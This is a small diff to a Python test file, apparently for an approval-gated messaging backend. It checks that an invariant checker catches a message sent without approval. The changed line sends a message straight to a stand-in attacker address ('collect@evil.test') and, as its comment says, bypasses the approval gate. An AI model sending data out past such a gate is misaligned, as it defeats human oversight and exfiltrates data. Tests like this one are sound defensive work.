@@ -108,7 +108,7 @@ def test_every_call_logged_and_chain_verifies(world: WorldFactory) -> None:
 
 def test_invariant_checker_catches_unapproved_send(tmp_path: Path) -> None:
     w = build_world(tmp_path)
-    w.backend.send_message(["collect@evil.test"], [], "s", "b")  # bypasses the gate
+    w.backend.send_message(["collect@evil.test"], [], "s", "b", None)  # bypasses the gate
     w.log.close()
     with pytest.raises(AssertionError, match="without a matching approved prompt"):
         check_invariants(w)
